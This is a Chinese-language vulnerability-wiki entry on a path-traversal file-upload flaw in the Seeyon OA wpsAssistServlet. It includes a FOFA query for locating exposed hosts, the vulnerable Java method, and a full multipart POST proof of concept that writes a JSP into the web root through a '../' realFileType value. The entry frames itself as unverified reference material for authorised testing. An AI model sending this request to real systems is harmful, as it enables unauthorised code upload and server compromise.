---
source: "Threekiii/Vulnerability-Wiki"
title: "致远OA wpsAssistServlet realFileType路径穿越写入"
product: "致远OA"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "A6/A8/A8N8.0SP2/8.1/SP1及G6/G6N8.1/SP1；补丁220706-S004"
prerequisites: "样本无Cookie，外层权限未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/Threekiii/Vulnerability-Wiki"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA-wpsAssistServlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
id: "vw-7680b161a75a71094bef7e15"
entity_id: "ve-7680b161a75a71094bef7e15"
schema_version: "1"
---

# 致远OA wpsAssistServlet realFileType路径穿越写入

## 条目说明

- 对象与具体问题：致远OA；wpsAssistServlet realFileType路径穿越写入
- 版本、配置及部署条件：A6/A8/A8N8.0SP2/8.1/SP1及G6/G6N8.1/SP1；补丁220706-S004
- 认证与权限前提：样本无Cookie，外层权限未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 系列中最强：明确补丁号、oaSaveFile源码和realFileType/fileId路径来源，应作为技术主文
- 完整multipart比其他转载字段齐全；默认temporary目录和ApacheJetspeed部署条件需保留
- CVE2025-34040新编号只能经登记核后关联，不凭标题确认

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

### 漏洞描述

致远OA wpsAssistServlet接口存在任意文件上传漏洞，攻击者通过漏洞可以发送特定的请求包上传恶意文件，获取服务器权限

### 漏洞影响

```
致远OA A6、A8、A8N (V8.0SP2，V8.1，V8.1SP1)
致远OA G6、G6N (V8.1、V8.1SP1)
```

### 网络测绘

```
app="致远互联-OA" && title="V8.0SP2"
```

### 漏洞复现

产品主页

![image-20220824142723820](./.resource/致远OA-wpsAssistServlet-任意文件上传漏洞/media/202208241427877.png)

下载补丁220706-S004 ，对比修改的文件

![image-20220824142736294](./.resource/致远OA-wpsAssistServlet-任意文件上传漏洞/media/202208241427361.png)

主要修改的是 `com.seeyon.ctp.common.wpsassist.manager.WpsAssistManagerImpl.oaSaveFile` 这个方法

```
private Map<String, Object> oaSaveFile(HttpServletRequest request, Map<String, Object> param) throws Exception {
        Map<String, Object> result = Maps.newHashMap();
        result.put(BusinessKey.OfficeTransResultFlag.getCode(), (Object)null);
        Long fileId = MapUtils.getLong(param, "fileId");
        log.info("wpsAssist SaveFile start!fileId=" + fileId);
        String newPdfFileId = MapUtils.getString(param, "newPdfFileId");
        if (Strings.isNotBlank(newPdfFileId)) {
            fileId = Long.valueOf(newPdfFileId);
        }

        String realFileType = MapUtils.getString(param, "realFileType");
        String tempFileIdPathSuffix = SystemEnvironment.getSystemTempFolder() + File.separator + fileId + realFileType;
        Long count = this.saveFileToPath(request, tempFileIdPathSuffix);
        result.put(BusinessKey.FileSize.getCode(), count);
        result.putAll(this.createOfficeTransCacheFile(fileId, tempFileIdPathSuffix, MapUtils.getString(param, "canTransFileType")));
        param.put(BusinessKey.OfficeTransResultFlag.getCode(), result.get(BusinessKey.OfficeTransResultFlag.getCode()));
        this.copyToUploadAndTrans(param);
        return result;
    }
```

向上追溯调用的 oaSaveFile方法的代码

![image-20220824142757449](./.resource/致远OA-wpsAssistServlet-任意文件上传漏洞/media/202208241427516.png)

![image-20220824142808032](./.resource/致远OA-wpsAssistServlet-任意文件上传漏洞/media/202208241428101.png)

在 `com.seeyon.ctp.common.wpsassist.WpsAssistServlet.doPost` 中，flag参数为save时，可以调用文件上传接口

![image-20220824142821539](./.resource/致远OA-wpsAssistServlet-任意文件上传漏洞/media/202208241428602.png)

`C://Seeyon/A6/base/temporary` 为默认上传的位置，但 `realFileType, fileId` 参数可控，可以通过 ../ 遍历上传到任意目录下，验证POC

```http
POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/debugggg.jsp&fileId=2 HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b
Accept-Encoding: gzip

--59229605f98b8cf290a7b8908b34616b
Content-Disposition: form-data; name="upload"; filename="123.xls"
Content-Type: application/vnd.ms-excel

<% out.println("seeyon_vuln");%>
--59229605f98b8cf290a7b8908b34616b--
```

> 请求长度说明：原资料 Content-Length 为 349；静态长度已移除，应由客户端根据最终请求体的字节数生成。

![image-20220824142837723](./.resource/致远OA-wpsAssistServlet-任意文件上传漏洞/media/202208241428763.png)

![image-20220824142846959](./.resource/致远OA-wpsAssistServlet-任意文件上传漏洞/media/202208241428999.png)

---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
